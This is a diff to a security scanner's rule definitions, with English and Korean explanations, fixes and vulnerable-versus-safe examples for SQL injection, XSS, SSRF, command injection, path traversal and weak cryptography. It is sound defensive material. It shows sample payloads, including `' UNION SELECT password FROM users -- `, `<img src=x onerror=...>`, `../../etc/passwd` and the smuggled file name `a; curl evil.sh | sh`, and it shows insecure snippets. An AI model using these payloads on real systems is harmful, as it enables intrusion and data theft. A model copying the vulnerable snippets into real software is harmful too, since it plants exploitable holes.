@@ -19,13 +19,24 @@ export const SOURCE_RULES = [
     languages: JS_TS,
     standards: { owasp: ["A05:2025"], cwe: ["CWE-89"], cert: [] },
     rationale: {
-      en: "Input can change the structure of the SQL statement (read, modify or delete data).",
-      ko: "입력값이 SQL 문의 구조를 바꿀 수 있어 데이터가 조회·수정·삭제될 수 있습니다.",
+      en: "When a request value is concatenated into the SQL text passed to a pg or mysql2 `query()`, an attacker can send input such as `' OR '1'='1` or `' UNION SELECT password FROM users -- ` that changes the statement itself. That can read other users' rows or other tables and skip a login check; where the driver allows multiple statements (pg does, mysql2 only with `multipleStatements: true`) it can also modify or delete data. It applies whenever the value comes from a request, a file or any other untrusted source.",
+      ko: "pg나 mysql2의 `query()`에 넘기는 SQL 문자열에 요청 값을 이어 붙이면, 공격자가 `' OR '1'='1`이나 `' UNION SELECT password FROM users -- ` 같은 입력으로 SQL 문 자체를 바꿀 수 있습니다. 그러면 다른 사용자의 행이나 다른 테이블을 조회하고 로그인 확인을 건너뛸 수 있으며, 드라이버가 여러 문장을 허용하면(pg는 허용, mysql2는 `multipleStatements: true`일 때만) 데이터를 수정·삭제할 수도 있습니다. 값이 요청, 파일 등 신뢰할 수 없는 출처에서 오면 언제나 해당됩니다.",
     },
     remediation: {
-      en: "Pass values as bound parameters (e.g. `query('... WHERE id = $1', [id])`) instead of building SQL text.",
-      ko: "SQL 문자열을 직접 만들지 말고 값을 바인딩된 매개변수로 전달하세요(예: `query('... WHERE id = $1', [id])`).",
+      en: "Keep the SQL text constant and pass the values as bound parameters: `pool.query('SELECT * FROM users WHERE id = $1', [id])` for pg, or `?` placeholders for mysql2. Table and column names cannot be bound, so pick them from a fixed allowlist instead of using input directly.",
+      ko: "SQL 문자열은 고정해 두고 값은 바인딩된 매개변수로 전달하세요. pg는 `pool.query('SELECT * FROM users WHERE id = $1', [id])`, mysql2는 `?` 플레이스홀더를 사용합니다. 테이블 이름과 컬럼 이름은 바인딩할 수 없으므로 입력을 그대로 쓰지 말고 고정된 허용 목록(allowlist)에서 고르세요.",
     },
+    examples: [
+      {
+        language: "javascript",
+        vulnerable: "pool.query(`SELECT * FROM users WHERE email = '${email}'`);",
+        safe: "pool.query('SELECT * FROM users WHERE email = $1', [email]);",
+        note: {
+          en: "`email` set to `' OR '1'='1` returns every user in the first form and nothing in the second.",
+          ko: "`email`이 `' OR '1'='1`이면 첫 번째 코드는 모든 사용자를 반환하고 두 번째 코드는 아무것도 반환하지 않습니다.",
+        },
+      },
+    ],
   },
   {
     id: "PG-SQL-002",
@@ -36,13 +47,21 @@ export const SOURCE_RULES = [
     languages: JS_TS,
     standards: { owasp: ["A05:2025"], cwe: ["CWE-89"], cert: [] },
     rationale: {
-      en: "Input can change the structure of the raw SQL statement.",
-      ko: "입력이 raw SQL 문의 구조를 바꿀 수 있습니다.",
+      en: "`$queryRawUnsafe` and `$executeRawUnsafe` send the string you build to the database as SQL, unchanged. Interpolating a request value lets an attacker alter the statement (for example `1 OR 1=1`) and read or change rows that Prisma's typed API would never expose.",
+      ko: "`$queryRawUnsafe`와 `$executeRawUnsafe`는 만든 문자열을 그대로 SQL로 데이터베이스에 보냅니다. 요청 값을 끼워 넣으면 공격자가 SQL 문 자체를 바꿀 수 있고(예: `1 OR 1=1`), Prisma의 타입 지정 API로는 접근할 수 없었을 행을 조회하거나 수정할 수 있습니다.",
     },
     remediation: {
-      en: "Use the tagged template `$queryRaw` / `$executeRaw` or `Prisma.sql`, or pass values as extra parameters to the Unsafe variant.",
-      ko: "태그드 템플릿 `$queryRaw` / `$executeRaw`나 `Prisma.sql`을 사용하거나, Unsafe 변형에는 값을 추가 매개변수로 전달하세요.",
+      en: 'Use the tagged templates, which turn every `${}` into a bound parameter: ``prisma.$queryRaw`SELECT * FROM "User" WHERE id = ${id}` `` (or compose with `Prisma.sql`). If you must call an Unsafe variant, keep the SQL text constant and pass the values as extra arguments (`$1`, `$2` on PostgreSQL, `?` on MySQL). Never pass a request value to `Prisma.raw`.',
+      ko: '모든 `${}`를 바인딩된 매개변수로 바꿔 주는 태그드 템플릿을 사용하세요: ``prisma.$queryRaw`SELECT * FROM "User" WHERE id = ${id}` ``(또는 `Prisma.sql`로 조합). Unsafe 변형을 꼭 써야 한다면 SQL 문자열은 고정하고 값은 추가 인자(PostgreSQL은 `$1`, `$2`, MySQL은 `?`)로 전달하세요. 요청 값을 `Prisma.raw`에 넘기지 마세요.',
     },
+    examples: [
+      {
+        language: "typescript",
+        vulnerable:
+          "await prisma.$queryRawUnsafe(`SELECT * FROM \"User\" WHERE name = '${name}'`);",
+        safe: 'await prisma.$queryRaw`SELECT * FROM "User" WHERE name = ${name}`;',
+      },
+    ],
   },
   {
     id: "PG-SQL-003",
@@ -53,13 +72,20 @@ export const SOURCE_RULES = [
     languages: ["go"],
     standards: { owasp: ["A05:2025"], cwe: ["CWE-89"], cert: [] },
     rationale: {
-      en: "Input can change the structure of the SQL statement.",
-      ko: "입력이 SQL 문의 구조를 바꿀 수 있습니다.",
+      en: "Building the query with `fmt.Sprintf` or `+` puts request data into the SQL text that `database/sql` sends. An attacker can close the string literal and append conditions, for example `' OR '1'='1`, to bypass a filter or read other tables.",
+      ko: "`fmt.Sprintf`나 `+`로 쿼리를 만들면 요청 데이터가 `database/sql`이 보내는 SQL 문자열에 들어갑니다. 공격자는 문자열 리터럴을 닫고 `' OR '1'='1` 같은 조건을 덧붙여 필터를 우회하거나 다른 테이블을 읽을 수 있습니다.",
     },
     remediation: {
-      en: "Use placeholders (`?` or `$1`) and pass values as arguments to Query/Exec.",
-      ko: "플레이스홀더(`?` 또는 `$1`)를 사용하고 값은 Query/Exec의 인자로 전달하세요.",
+      en: 'Write the SQL with placeholders (`?` for MySQL and SQLite, `$1` for PostgreSQL) and pass the values as arguments: `db.QueryContext(ctx, "SELECT * FROM users WHERE id = $1", id)`. Placeholders cannot replace table or column names; map those from a fixed allowlist.',
+      ko: 'SQL은 플레이스홀더(MySQL·SQLite는 `?`, PostgreSQL은 `$1`)로 작성하고 값은 인자로 전달하세요: `db.QueryContext(ctx, "SELECT * FROM users WHERE id = $1", id)`. 플레이스홀더는 테이블 이름이나 컬럼 이름을 대신할 수 없으므로, 그런 값은 고정된 허용 목록(allowlist)에서 골라 쓰세요.',
     },
+    examples: [
+      {
+        language: "go",
+        vulnerable: 'rows, err := db.Query(fmt.Sprintf("SELECT * FROM users WHERE id = %s", id))',
+        safe: 'rows, err := db.QueryContext(ctx, "SELECT * FROM users WHERE id = $1", id)',
+      },
+    ],
   },
   {
     id: "PG-SQL-004",
@@ -70,13 +96,20 @@ export const SOURCE_RULES = [
     languages: ["go"],
     standards: { owasp: ["A05:2025"], cwe: ["CWE-89"], cert: [] },
     rationale: {
-      en: "Input can change the structure of the SQL statement.",
-      ko: "입력이 SQL 문의 구조를 바꿀 수 있습니다.",
+      en: "`Raw`, `Exec` and `Where` with a string built using `fmt.Sprintf` or `+` send request data to the database as SQL text. A value such as `x' OR '1'='1` changes the condition and exposes or modifies rows the handler never meant to touch.",
+      ko: "`fmt.Sprintf`나 `+`로 만든 문자열을 `Raw`, `Exec`, `Where`에 넘기면 요청 데이터가 SQL 문자열로 데이터베이스에 전달됩니다. `x' OR '1'='1` 같은 값이 조건을 바꿔, 핸들러가 건드릴 의도가 없던 행이 노출되거나 수정될 수 있습니다.",
     },
     remediation: {
-      en: 'Use GORM placeholders, e.g. `db.Where("name = ?", name)`, `db.Raw("... ?", v)`.',
-      ko: 'GORM 플레이스홀더를 사용하세요. 예: `db.Where("name = ?", name)`, `db.Raw("... ?", v)`.',
+      en: 'Pass the values as arguments to GORM placeholders: `db.Where("name = ?", name)`, `db.Raw("SELECT * FROM users WHERE id = ?", id)`. The struct form (`db.Where(&User{Name: name})`) is also safe, but it ignores zero values (`0`, `""`, `false`) and silently drops that condition, so use placeholders or the map form when a zero value is a valid filter. Never build the SQL string itself from input.',
+      ko: '값은 GORM 플레이스홀더의 인자로 전달하세요: `db.Where("name = ?", name)`, `db.Raw("SELECT * FROM users WHERE id = ?", id)`. 구조체 형태(`db.Where(&User{Name: name})`)도 안전하지만 영값(`0`, `""`, `false`)은 무시되어 그 조건이 조용히 빠지므로, 영값도 유효한 필터라면 플레이스홀더나 맵 형태를 쓰세요. 입력으로 SQL 문자열 자체를 만들지 마세요.',
     },
+    examples: [
+      {
+        language: "go",
+        vulnerable: "db.Where(fmt.Sprintf(\"name = '%s'\", name)).Find(&users)",
+        safe: 'db.Where("name = ?", name).Find(&users)',
+      },
+    ],
   },
   {
     id: "PG-XSS-001",
@@ -87,13 +120,20 @@ export const SOURCE_RULES = [
     languages: JS_TS,
     standards: { owasp: ["A05:2025"], cwe: ["CWE-79"], cert: [] },
     rationale: {
-      en: "Untrusted HTML can run script in the user's browser.",
-      ko: "신뢰할 수 없는 HTML을 통해 사용자 브라우저에서 스크립트가 실행될 수 있습니다.",
+      en: "Assigning HTML that contains request or stored data to `innerHTML`, `outerHTML` or `document.write` makes the browser parse it as markup. An attacker who controls part of it can inject `<img src=x onerror=...>` or `<svg onload=...>` (a `<script>` tag set through `innerHTML` does not run, but event handlers do) and run code in the victim's session, read tokens held in the page, or send requests with that user's rights.",
+      ko: "요청이나 저장된 데이터가 들어 있는 HTML을 `innerHTML`, `outerHTML`, `document.write`에 넣으면 브라우저가 이를 마크업으로 해석합니다. 일부라도 공격자가 정할 수 있으면 `<img src=x onerror=...>`나 `<svg onload=...>`를 주입해(`innerHTML`로 넣은 `<script>` 태그는 실행되지 않지만 이벤트 핸들러는 실행됩니다) 피해자의 세션에서 코드를 실행하고, 페이지에 있는 토큰을 읽거나, 그 사용자 권한으로 요청을 보낼 수 있습니다.",
     },
     remediation: {
-      en: "Use textContent, or sanitize with a maintained sanitizer (e.g. DOMPurify) before inserting HTML.",
-      ko: "textContent를 사용하거나, HTML을 삽입하기 전에 꾸준히 유지보수되는 sanitizer(예: DOMPurify)로 sanitize하세요.",
+      en: "Insert text with `textContent` (or `createElement` and `append`) so the browser never parses it as HTML. If you must render HTML, sanitize it with a maintained sanitizer first, as in `el.innerHTML = DOMPurify.sanitize(html)`, and keep a Content-Security-Policy as a second layer.",
+      ko: "텍스트는 `textContent`(또는 `createElement`와 `append`)로 넣어 브라우저가 HTML로 해석하지 않게 하세요. HTML을 꼭 렌더링해야 한다면 먼저 `el.innerHTML = DOMPurify.sanitize(html)`처럼 꾸준히 유지보수되는 sanitizer로 sanitize하고, 보조 방어선으로 Content-Security-Policy를 함께 두세요.",
     },
+    examples: [
+      {
+        language: "javascript",
+        vulnerable: "el.innerHTML = `<p>${comment}</p>`;",
+        safe: "const p = document.createElement('p');\np.textContent = comment;\nel.append(p);",
+      },
+    ],
   },
   {
     id: "PG-XSS-002",
@@ -104,13 +144,20 @@ export const SOURCE_RULES = [
     languages: ["react"],
     standards: { owasp: ["A05:2025"], cwe: ["CWE-79"], cert: [] },
     rationale: {
-      en: "Untrusted HTML can run script in the user's browser.",
-      ko: "신뢰할 수 없는 HTML을 통해 사용자 브라우저에서 스크립트가 실행될 수 있습니다.",
+      en: "React escapes values in JSX, but `dangerouslySetInnerHTML` bypasses that. HTML that contains request or stored data lets an attacker inject markup such as `<img src=x onerror=...>` and run script as the user who views the page.",
+      ko: "React는 JSX의 값을 이스케이프하지만 `dangerouslySetInnerHTML`은 이를 우회합니다. 요청이나 저장된 데이터가 들어 있는 HTML을 넣으면 공격자가 `<img src=x onerror=...>` 같은 마크업을 주입해 페이지를 보는 사용자 권한으로 스크립트를 실행할 수 있습니다.",
     },
     remediation: {
-      en: "Render text through JSX, or sanitize the HTML (e.g. DOMPurify) first.",
-      ko: "JSX로 텍스트를 렌더링하거나, 먼저 HTML을 sanitize하세요(예: DOMPurify).",
+      en: "Render the value as a JSX child (`<p>{comment}</p>`), which React escapes. If the content really is HTML, sanitize it first: `<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />`.",
+      ko: "값을 JSX 자식(`<p>{comment}</p>`)으로 렌더링하면 React가 이스케이프합니다. 내용이 정말 HTML이라면 먼저 sanitize하세요: `<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />`.",
     },
+    examples: [
+      {
+        language: "react",
+        vulnerable: "<div dangerouslySetInnerHTML={{ __html: comment }} />",
+        safe: "<p>{comment}</p>",
+      },
+    ],
   },
   {
     id: "PG-XSS-003",
@@ -121,13 +168,16 @@ export const SOURCE_RULES = [
     languages: ["vue"],
     standards: { owasp: ["A05:2025"], cwe: ["CWE-79"], cert: [] },
     rationale: {
-      en: "Untrusted HTML can run script in the user's browser.",
-      ko: "신뢰할 수 없는 HTML을 통해 사용자 브라우저에서 스크립트가 실행될 수 있습니다.",
+      en: "`v-html` inserts its value as raw HTML and skips Vue's escaping. If the value contains request or stored data, an attacker can inject markup such as `<img src=x onerror=...>` and run script as the user who views the page.",
+      ko: "`v-html`은 값을 원시 HTML로 삽입하며 Vue의 이스케이프를 건너뜁니다. 값에 요청이나 저장된 데이터가 들어 있으면 공격자가 `<img src=x onerror=...>` 같은 마크업을 주입해 페이지를 보는 사용자 권한으로 스크립트를 실행할 수 있습니다.",
     },
     remediation: {
-      en: "Use text interpolation (`{{ }}`), or sanitize the HTML before binding it.",
-      ko: "텍스트 보간(`{{ }}`)을 사용하거나, HTML을 바인딩하기 전에 sanitize하세요.",
+      en: "Use text interpolation (`{{ comment }}`), which Vue escapes. If the content really is HTML, bind a sanitized copy, for example a computed value built with `DOMPurify.sanitize(html)`, and do not bind user-supplied HTML at all when plain text is enough.",
+      ko: "Vue가 이스케이프하는 텍스트 보간(`{{ comment }}`)을 사용하세요. 내용이 정말 HTML이라면 `DOMPurify.sanitize(html)`로 만든 computed 값처럼 sanitize한 사본을 바인딩하고, 일반 텍스트로 충분하다면 사용자가 준 HTML은 아예 바인딩하지 마세요.",
     },
+    examples: [
+      { language: "vue", vulnerable: '<div v-html="comment"></div>', safe: "<p>{{ comment }}</p>" },
+    ],
   },
   {
     id: "PG-SSRF-001",
@@ -138,13 +188,24 @@ export const SOURCE_RULES = [
     languages: ["javascript", "typescript", "go"],
     standards: { owasp: ["A01:2025"], cwe: ["CWE-918"], cert: [] },
     rationale: {
-      en: "The server can be made to call internal services or cloud metadata endpoints.",
-      ko: "서버가 내부 서비스나 클라우드 메타데이터 엔드포인트를 호출하도록 유도될 수 있습니다.",
+      en: "When the server fetches a URL taken from request input, an attacker can point it at internal targets such as `http://169.254.169.254/` (cloud metadata with credentials), `http://localhost:6379` or admin pages on the private network. The response, or an error or timing difference, leaks data the attacker could never reach directly. Redirects and host names that resolve to private addresses defeat simple checks.",
+      ko: "서버가 요청 입력에서 받은 URL을 가져오면 공격자는 `http://169.254.169.254/`(자격 증명이 담긴 클라우드 메타데이터), `http://localhost:6379`, 사설망의 관리 페이지 같은 내부 대상을 가리킬 수 있습니다. 응답이나 오류·응답 시간의 차이를 통해 공격자가 직접 닿을 수 없던 데이터가 새어 나갑니다. 리다이렉트나 사설 주소로 확인되는 호스트 이름은 단순한 검사를 무력화합니다.",
     },
     remediation: {
-      en: "Allow only known hosts/schemes (allowlist), resolve and block private addresses, and do not forward raw user URLs.",
-      ko: "알려진 호스트와 스킴만 허용 목록(allowlist)으로 허용하고, 호스트 이름을 IP로 확인(resolve)한 뒤 사설 주소를 차단하며, 사용자가 준 URL을 그대로 전달하지 마세요.",
+      en: "Do not fetch raw user URLs; prefer an id that maps to a fixed URL. Otherwise (PGARD still reports a fetch of a validated user URL, so review that finding by hand) parse the URL, allow only `https` and hosts on an allowlist, resolve the host and reject loopback, link-local and private addresses, connect to the address you checked (to avoid DNS rebinding), and disable redirects or re-check each hop. Also require IMDSv2 or the equivalent on cloud metadata services.",
+      ko: "사용자가 준 URL을 그대로 가져오지 말고, 고정 URL에 대응하는 id를 쓰는 편이 좋습니다. 그렇지 않다면(검증한 사용자 URL을 가져오는 코드도 PGARD는 계속 보고하므로 그 항목은 직접 검토하세요) URL을 파싱해 `https`와 허용 목록(allowlist)의 호스트만 허용하고, 호스트 이름을 IP로 확인(resolve)해 loopback·링크 로컬·사설 주소를 거부하세요. 검사한 바로 그 주소로 연결해 DNS rebinding을 막고, 리다이렉트는 끄거나 단계마다 다시 검사하세요. 클라우드 메타데이터 서비스에는 IMDSv2 같은 보호도 적용하세요.",
     },
+    examples: [
+      {
+        language: "javascript",
+        vulnerable: "const res = await fetch(req.query.url);",
+        safe: "const res = await fetch(FEEDS[req.query.id]); // FEEDS maps ids to fixed https URLs",
+        note: {
+          en: "When users really must supply a URL, validate it as described in the remediation and review the finding by hand.",
+          ko: "사용자가 URL을 직접 줘야 한다면 조치 방법대로 검증하고, 보고된 항목은 직접 검토하세요.",
+        },
+      },
+    ],
   },
   {
     id: "PG-CMD-001",
@@ -159,13 +220,20 @@ export const SOURCE_RULES = [
       cert: [{ kind: "via-cwe", id: "IDS07-J", cwe: "CWE-78" }],
     },
     rationale: {
-      en: "Input can inject additional shell commands.",
-      ko: "입력을 통해 추가 셸 명령이 주입될 수 있습니다.",
+      en: "A command string built from request data and run through a shell (`exec`, `execSync`, or `spawn` with `shell: true`) lets an attacker append commands with `;`, `&&`, `|` or `$(...)`. A file name such as `a; curl evil.sh | sh` then runs with the privileges of the server process.",
+      ko: "요청 데이터로 만든 명령 문자열을 셸을 통해 실행하면(`exec`, `execSync`, `shell: true`인 `spawn`) 공격자가 `;`, `&&`, `|`, `$(...)`로 명령을 덧붙일 수 있습니다. 예를 들어 파일 이름이 `a; curl evil.sh | sh`이면 서버 프로세스의 권한으로 실행됩니다.",
     },
     remediation: {
-      en: "Use execFile/spawn with an argument array and no shell; validate arguments against an allowlist.",
-      ko: "셸 없이 인자 배열과 함께 execFile/spawn을 사용하고, 인자는 허용 목록(allowlist)으로 검증하세요.",
+      en: "Do not use a shell. Call `execFile('git', ['log', '--end-of-options', ref, '--'])` or `spawn` with an argument array, so each argument is passed as-is and never parsed by a shell. Validate arguments against an allowlist, and tell the program where options end (`--end-of-options` for git 2.24+, or `--` for programs that support it) so a user value cannot be read as an option.",
+      ko: "셸을 쓰지 마세요. `execFile('git', ['log', '--end-of-options', ref, '--'])`나 인자 배열을 쓰는 `spawn`을 호출하면 각 인자가 셸의 해석 없이 그대로 전달됩니다. 인자는 허용 목록(allowlist)으로 검증하고, 프로그램에 옵션이 끝나는 지점을 알려(git 2.24 이상은 `--end-of-options`, 지원하는 프로그램은 `--`) 사용자 값이 옵션으로 읽히지 않게 하세요.",
     },
+    examples: [
+      {
+        language: "javascript",
+        vulnerable: "exec(`git log ${ref}`);",
+        safe: "execFile('git', ['log', '--end-of-options', ref, '--']);",
+      },
+    ],
   },
   {
     id: "PG-CMD-002",
@@ -180,13 +248,20 @@ export const SOURCE_RULES = [
       cert: [{ kind: "via-cwe", id: "IDS07-J", cwe: "CWE-78" }],
     },
     rationale: {
-      en: "Input can inject additional shell commands.",
-      ko: "입력을 통해 추가 셸 명령이 주입될 수 있습니다.",
+      en: '`exec.Command("sh", "-c", ...)` with a string built from request data lets an attacker append commands with `;`, `&&` or `$(...)`. A program name taken from input lets them run any binary on the host. Either way the command runs with the server\'s privileges.',
+      ko: '요청 데이터로 만든 문자열을 `exec.Command("sh", "-c", ...)`에 넘기면 공격자가 `;`, `&&`, `$(...)`로 명령을 덧붙일 수 있습니다. 프로그램 이름을 입력에서 받으면 호스트의 어떤 실행 파일이든 실행시킬 수 있습니다. 어느 쪽이든 명령은 서버의 권한으로 실행됩니다.',
     },
     remediation: {
-      en: 'Call the program directly with separate arguments (`exec.Command("git", "log")`), never via `sh -c`.',
-      ko: '인자를 분리해 프로그램을 직접 호출하고(`exec.Command("git", "log")`), `sh -c`를 거치지 마세요.',
+      en: 'Call the program directly with a fixed name and separate arguments: `exec.Command("git", "log", "--end-of-options", ref, "--")`. Go passes each argument without a shell. Never take the program name from input, validate arguments against an allowlist, and tell the program where options end (`--end-of-options` for git 2.24+, or `--` where supported) so a user value cannot be read as an option.',
+      ko: '고정된 프로그램 이름과 분리된 인자로 직접 호출하세요: `exec.Command("git", "log", "--end-of-options", ref, "--")`. Go는 각 인자를 셸 없이 전달합니다. 프로그램 이름을 입력에서 받지 말고, 인자는 허용 목록(allowlist)으로 검증하며, 프로그램에 옵션이 끝나는 지점을 알려(git 2.24 이상은 `--end-of-options`, 지원하는 곳에서는 `--`) 사용자 값이 옵션으로 읽히지 않게 하세요.',
     },
+    examples: [
+      {
+        language: "go",
+        vulnerable: 'exec.Command("sh", "-c", "git log "+ref).Run()',
+        safe: 'exec.Command("git", "log", "--end-of-options", ref, "--").Run()',
+      },
+    ],
   },
   {
     id: "PG-PATH-001",
@@ -197,13 +272,20 @@ export const SOURCE_RULES = [
     languages: ["javascript", "typescript", "go"],
     standards: { owasp: ["A01:2025"], cwe: ["CWE-22"], cert: [] },
     rationale: {
-      en: "`../` sequences can read or serve files outside the intended directory.",
-      ko: "`../` 시퀀스로 의도한 디렉터리 밖의 파일을 읽거나 내려받게 할 수 있습니다.",
+      en: "Using a request value as part of a file path lets an attacker send `../../etc/passwd` (or backslash, absolute-path and encoded variants) to read or download files outside the intended directory, such as configuration, keys and source code.",
+      ko: "요청 값을 파일 경로의 일부로 쓰면 공격자가 `../../etc/passwd`(또는 역슬래시, 절대 경로, 인코딩된 변형)를 보내 의도한 디렉터리 밖의 파일(설정, 키, 소스 코드 등)을 읽거나 내려받을 수 있습니다.",
     },
     remediation: {
-      en: "Reduce the input to a basename or id, resolve against a fixed root and verify the result stays inside it.",
-      ko: "입력을 basename이나 id로 줄이고, 고정된 루트를 기준으로 해석한 뒤 결과가 그 루트 안에 있는지 확인하세요.",
+      en: "Prefer an id looked up in a table over a file name. Otherwise reduce the input with `path.basename`, resolve it against a fixed root (`path.resolve(root, name)`), and check that the result starts with the root plus a separator before opening it. In Go, use `filepath.Join` with the same prefix check, or `os.Root` (Go 1.24+).",
+      ko: "파일 이름 대신 표에서 찾는 id를 쓰는 편이 좋습니다. 그렇지 않다면 입력을 `path.basename`으로 줄이고, 고정된 루트를 기준으로 해석(`path.resolve(root, name)`)한 뒤 파일을 열기 전에 결과가 루트와 구분자로 시작하는지 확인하세요. Go에서는 `filepath.Join`과 같은 접두사 검사를 하거나 `os.Root`(Go 1.24 이상)를 사용하세요.",
     },
+    examples: [
+      {
+        language: "javascript",
+        vulnerable: "res.sendFile(path.join(UPLOADS, req.query.name));",
+        safe: "// once, at startup: const UPLOADS = path.resolve('uploads');\nconst file = path.resolve(UPLOADS, path.basename(req.query.name));\nif (!file.startsWith(UPLOADS + path.sep)) return res.sendStatus(400);\nres.sendFile(file);",
+      },
+    ],
   },
   {
     id: "PG-CRYPTO-001",
@@ -214,13 +296,20 @@ export const SOURCE_RULES = [
     languages: ["javascript", "typescript", "go"],
     standards: { owasp: ["A04:2025"], cwe: ["CWE-916", "CWE-328"], cert: [] },
     rationale: {
-      en: "Password hashes can be cracked quickly after a database leak.",
-      ko: "데이터베이스가 유출되면 비밀번호 해시가 빠르게 크래킹될 수 있습니다.",
+      en: "MD5 and SHA-1 are fast hashes. After a database leak an attacker can test billions of guesses per second on a GPU, so most passwords are recovered quickly. Both are also broken against collisions.",
+      ko: "MD5와 SHA-1은 빠른 해시입니다. 데이터베이스가 유출되면 공격자가 GPU로 초당 수십억 번의 추측을 시도할 수 있어 대부분의 비밀번호가 빠르게 복구됩니다. 두 알고리즘 모두 충돌에 대해서도 이미 깨졌습니다.",
     },
     remediation: {
-      en: "Hash passwords with bcrypt, scrypt or Argon2id with a per-user salt.",
-      ko: "사용자마다 다른 salt를 적용해 bcrypt, scrypt 또는 Argon2id로 비밀번호를 해시하세요.",
+      en: "Hash passwords with a slow, salted algorithm built for that purpose (Argon2id, scrypt or bcrypt), for example `await bcrypt.hash(password, 12)` or `golang.org/x/crypto/bcrypt`. The library generates the per-user salt. Rehash existing users at their next login.",
+      ko: "비밀번호 해시용으로 만들어진 느리고 salt가 적용되는 알고리즘(Argon2id, scrypt, bcrypt)으로 해시하세요. 예: `await bcrypt.hash(password, 12)`, Go는 `golang.org/x/crypto/bcrypt`. 사용자별 salt는 라이브러리가 만듭니다. 기존 사용자는 다음 로그인 때 다시 해시하세요.",
     },
+    examples: [
+      {
+        language: "javascript",
+        vulnerable: "const hash = crypto.createHash('md5').update(password).digest('hex');",
+        safe: "const hash = await bcrypt.hash(password, 12);",
+      },
+    ],
   },
   {
     id: "PG-CRYPTO-002",
@@ -230,18 +319,25 @@ export const SOURCE_RULES = [
     scope: "code",
     languages: ["javascript", "typescript", "go"],
     standards: {
-      owasp: ["A04:2025"],
+      owasp: ["A04:2025", "A07:2025"],
       cwe: ["CWE-321", "CWE-798"],
       cert: [{ kind: "via-cwe", id: "MSC03-J", cwe: "CWE-798" }],
     },
     rationale: {
-      en: "Anyone with the source can decrypt data or forge tokens.",
-      ko: "소스 코드를 가진 사람은 누구나 데이터를 복호화하거나 토큰을 위조할 수 있습니다.",
+      en: "A key or signing secret written in the source is available to everyone who can read the repository, its history, a build artifact or a bundle. With it an attacker can decrypt stored data and forge tokens (for example a JWT signed with a known secret), and the key cannot be changed without a new release.",
+      ko: "소스에 적어 둔 키나 서명용 비밀정보는 저장소, 그 이력, 빌드 산출물, 번들을 읽을 수 있는 모든 사람이 가질 수 있습니다. 이를 이용해 공격자는 저장된 데이터를 복호화하고 토큰을 위조할 수 있으며(예: 알려진 비밀정보로 서명한 JWT), 새 릴리스 없이는 키를 바꿀 수도 없습니다.",
     },
     remediation: {
-      en: "Load keys from a secret store or environment at runtime and rotate the exposed key.",
-      ko: "키는 실행 시점에 비밀정보 저장소나 환경 변수에서 불러오고, 노출된 키는 교체(rotate)하세요.",
+      en: "Load the key at runtime from an environment variable or a secret manager, and generate it with a CSPRNG (`crypto.randomBytes(32)`). Treat the exposed key as compromised: rotate it, since it remains in Git history and old releases, then re-sign tokens and re-encrypt data under the new key.",
+      ko: "키는 실행 시점에 환경 변수나 비밀정보 관리 도구(secret manager)에서 불러오고, CSPRNG(`crypto.randomBytes(32)`)로 생성하세요. 노출된 키는 Git 이력과 이전 릴리스에 남아 있으므로 유출된 것으로 간주하고 교체(rotate)한 뒤, 새 키로 토큰을 다시 서명하고 데이터를 다시 암호화하세요.",
     },
+    examples: [
+      {
+        language: "javascript",
+        vulnerable: "const token = jwt.sign(payload, 'my-secret-key');",
+        safe: "const token = jwt.sign(payload, process.env.JWT_SECRET);",
+      },
+    ],
   },
   {
     id: "PG-CRYPTO-003",
@@ -250,19 +346,22 @@ export const SOURCE_RULES = [
     defaultSeverity: "medium",
     scope: "code",
     languages: JS_TS,
-    standards: {
-      owasp: ["A04:2025"],
-      cwe: ["CWE-327"],
-      cert: [{ kind: "via-cwe", id: "MSC02-J", cwe: "CWE-327" }],
-    },
+    standards: { owasp: ["A04:2025"], cwe: ["CWE-327"], cert: [] },
     rationale: {
-      en: "Encrypted data may be recoverable or tampered with.",
-      ko: "암호화된 데이터가 복호화되거나 변조될 수 있습니다.",
+      en: "Ciphers such as DES, 3DES and RC4, and modes such as ECB, are broken or leak the structure of the plaintext. An attacker who captures the ciphertext may recover data, and without authentication (a GCM tag or a MAC) can also modify it without detection.",
+      ko: "DES, 3DES, RC4 같은 암호나 ECB 같은 모드는 깨졌거나 평문의 구조를 드러냅니다. 암호문을 가로챈 공격자는 데이터를 복구할 수 있고, 인증(GCM 태그나 MAC)이 없으면 탐지되지 않게 변조할 수도 있습니다.",
     },
     remediation: {
-      en: "Use an AEAD cipher such as AES-256-GCM via createCipheriv with a random IV.",
-      ko: "무작위 IV와 함께 createCipheriv로 AES-256-GCM 같은 AEAD 암호를 사용하세요.",
+      en: "Use an AEAD cipher: AES-256-GCM through `crypto.createCipheriv('aes-256-gcm', key, iv)`, with a new random 12-byte IV for every message. Store the tag from `getAuthTag()` after encrypting. When decrypting, create the decipher with `{ authTagLength: 16 }` (or check the stored tag is 16 bytes) and call `setAuthTag()` before `final()`, so a truncated tag is rejected. Never reuse an IV with the same key.",
+      ko: "AEAD 암호를 사용하세요. `crypto.createCipheriv('aes-256-gcm', key, iv)`로 AES-256-GCM을 쓰고, 메시지마다 새 무작위 12바이트 IV를 만들며, 암호화한 뒤 `getAuthTag()`로 얻은 태그를 함께 저장하세요. 복호화할 때는 `{ authTagLength: 16 }`으로 decipher를 만들고(또는 저장된 태그가 16바이트인지 확인하고) `final()` 전에 `setAuthTag()`를 호출해 잘린 태그를 거부하세요. 같은 키로 IV를 재사용하지 마세요.",
     },
+    examples: [
+      {
+        language: "javascript",
+        vulnerable: "const cipher = crypto.createCipheriv('des-ede3-cbc', key, iv);",
+        safe: "const iv = crypto.randomBytes(12);\nconst cipher = crypto.createCipheriv('aes-256-gcm', key, iv, { authTagLength: 16 });",
+      },
+    ],
   },
   {
     id: "PG-AUTH-001",
@@ -271,15 +370,22 @@ export const SOURCE_RULES = [
     defaultSeverity: "high",
     scope: "code",
     languages: JS_TS,
-    standards: { owasp: ["A04:2025"], cwe: ["CWE-256"], cert: [] },
+    standards: { owasp: ["A06:2025"], cwe: ["CWE-256"], cert: [] },
     rationale: {
-      en: "A database leak exposes every user's password.",
-      ko: "데이터베이스가 유출되면 모든 사용자의 비밀번호가 노출됩니다.",
+      en: "A password saved as plain text, or in any reversible form, is exposed in full by any database leak, backup, log or SQL injection. Staff with database access can read it, and every user who reused it elsewhere is at risk too.",
+      ko: "평문이나 되돌릴 수 있는 형태로 저장한 비밀번호는 데이터베이스 유출, 백업, 로그, SQL 인젝션 어느 경우에나 그대로 노출됩니다. 데이터베이스에 접근하는 직원도 읽을 수 있고, 다른 곳에서 같은 비밀번호를 쓰는 사용자도 위험해집니다.",
     },
     remediation: {
